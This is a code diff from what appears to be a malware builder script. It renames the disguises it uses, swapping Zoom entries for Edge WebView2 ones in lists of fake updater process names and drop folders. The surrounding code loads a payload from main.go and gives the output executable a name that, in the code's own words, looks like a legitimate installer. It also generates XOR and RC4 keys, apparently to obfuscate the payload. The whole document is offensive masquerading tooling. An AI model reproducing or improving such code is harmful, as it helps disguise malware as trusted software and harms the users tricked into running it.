@@ -32,7 +32,7 @@ import time
 DROP_NAMES = [
     "OneDriveStandaloneUpdater", "ChromeRecovery", "SpotifyMigrator",
     "TeamsUpdater", "DiscordUpdate", "SlackUpdate",
-    "ZoomInstaller", "AdobeGCClient", "CCXProcess",
+    "EdgeWebView2Setup", "AdobeGCClient", "CCXProcess",
     "BraveCrashHandler", "OperaCrashReporter", "GrammarlyCEF",
 ]
 
@@ -40,7 +40,7 @@ DROP_NAMES = [
 DROP_SUBDIRS = [
     ("Spotify", "Data"),
     ("Discord", "Update"),
-    ("Zoom", "bin"),
+    ("Microsoft", "EdgeWebView2"),
     ("Adobe", "Connect"),
     ("Microsoft", "Teams", "Update"),
 ]
@@ -921,7 +921,7 @@ def main():
     log(f"Loaded payload: main.go ({len(raw_payload)} chars)", "OK")
 
     # Output name — looks like a legitimate app installer/updater
-    name_prefixes = ["ChromeSetup", "TeamsInstaller", "OneDriveSetup", "SpotifySetup", "ZoomInstaller"]
+    name_prefixes = ["ChromeSetup", "TeamsInstaller", "OneDriveSetup", "SpotifySetup", "EdgeWebView2Setup"]
     output_name = f"{random.choice(name_prefixes)}_{random.randint(100, 999)}.exe"
     xor_key = generate_key(32)
     rc4_key = generate_key(32)
